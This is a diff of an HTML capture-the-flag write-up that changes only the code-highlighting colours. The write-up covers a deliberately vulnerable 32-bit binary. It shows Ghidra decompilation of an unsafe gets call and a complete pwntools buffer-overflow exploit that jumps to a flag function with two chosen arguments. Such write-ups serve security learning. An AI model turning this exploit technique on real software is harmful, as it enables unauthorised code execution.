@@ -78,43 +78,43 @@
 <h2 id="source-code-analysis">Source Code Analysis</h2>
 <p>Since no source code was provided, I tried to disassemble the program in Ghidra. I found 3 interesting functions:</p>
 <p><strong>main:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  __gid_t __rgid;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(_stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>  __rgid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(__rgid,__rgid,__rgid);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You know who are 0xDiablos: &#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">setvbuf</span>(_stdout,(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>,<span style="color:#bd93f9">2</span>,<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>  __rgid <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">getegid</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">setresgid</span>(__rgid,__rgid,__rgid);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;You know who are 0xDiablos: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">vuln</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p><strong>vuln:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">void</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">vuln</span>(<span style="color:#8be9fd">void</span>)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_bc [<span style="color:#ae81ff">180</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> local_bc [<span style="color:#bd93f9">180</span>];
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(local_bc);
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(local_bc);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">gets</span>(local_bc);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(local_bc);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p><strong>flag:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">int</span> param_2)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">flag</span>(<span style="color:#8be9fd">int</span> param_1,<span style="color:#8be9fd">int</span> param_2)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_50 [<span style="color:#ae81ff">64</span>];
-</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>local_10;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> local_50 [<span style="color:#bd93f9">64</span>];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#ff79c6">*</span>local_10;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(local_50,<span style="color:#ae81ff">0x40</span>,local_10);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((param_1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x21524111</span>) <span style="color:#f92672">&amp;&amp;</span> (param_2 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x3f212ff3</span>)) {
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(local_50);
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(<span style="color:#f1fa8c">&#34;flag.txt&#34;</span>,<span style="color:#f1fa8c">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (local_10 <span style="color:#ff79c6">!=</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fgets</span>(local_50,<span style="color:#bd93f9">0x40</span>,local_10);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ((param_1 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x21524111</span>) <span style="color:#ff79c6">&amp;&amp;</span> (param_2 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x3f212ff3</span>)) {
+</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">printf</span>(local_50);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span>;
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Hurry up and try it on server side.&#34;</span>);
-</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;Hurry up and try it on server side.&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#6272a4">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">exit</span>(<span style="color:#bd93f9">0</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>In the <code>flag</code> function we can see that <code>param_1</code> and <code>param_2</code> need to match specific values. Ghidra already showed us those values:</p>
 <p><img src="leak.png" alt="leak"></p>
@@ -124,28 +124,28 @@
 <p>First we need the offset from the input buffer to the return address. With <code>cyclic 230</code> we can generate a 230-byte non-repeating string. When we paste it into the input field in pwndbg, we can see where the program crashes, the EIP will contain part of the pattern. We copy that value and run <code>cyclic -l &lt;value&gt;</code> to get the exact offset.</p>
 <p><img src="offset.png" alt="offset"></p>
 <p>With that offset and the two parameters, we can write a simple pwntools script:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;./vuln&#39;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./vuln&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># IP and port here</span>
-</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># IP and port here</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#ff79c6">=</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> remote(HOST, PORT)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;You know who are 0xDiablos: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;You know who are 0xDiablos: &#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>win  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80491e2</span>       <span style="color:#75715e"># address of the flag function (pwndbg: p flag)</span>
-</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># parameter 1 from Ghidra</span>
-</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xc0ded00d</span>) <span style="color:#75715e"># parameter 2 from Ghidra</span>
+</span></span><span style="display:flex;"><span>win  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x80491e2</span>       <span style="color:#6272a4"># address of the flag function (pwndbg: p flag)</span>
+</span></span><span style="display:flex;"><span>arg1 <span style="color:#ff79c6">=</span> p32(<span style="color:#bd93f9">0xdeadbeef</span>) <span style="color:#6272a4"># parameter 1 from Ghidra</span>
+</span></span><span style="display:flex;"><span>arg2 <span style="color:#ff79c6">=</span> p32(<span style="color:#bd93f9">0xc0ded00d</span>) <span style="color:#6272a4"># parameter 2 from Ghidra</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">188</span>, win, <span style="color:#ae81ff">0x0</span>, arg1, arg2) <span style="color:#75715e"># 0x0 is a fake return address</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> flat(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">188</span>, win, <span style="color:#bd93f9">0x0</span>, arg1, arg2) <span style="color:#6272a4"># 0x0 is a fake return address</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>send(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>interactive()
 </span></span></code></pre></div><p>Run the script with <code>python3 exploit.py</code>.</p>
 <p>And we got our flag:</p>
 <p><img src="flag.png" alt="flag"></p>
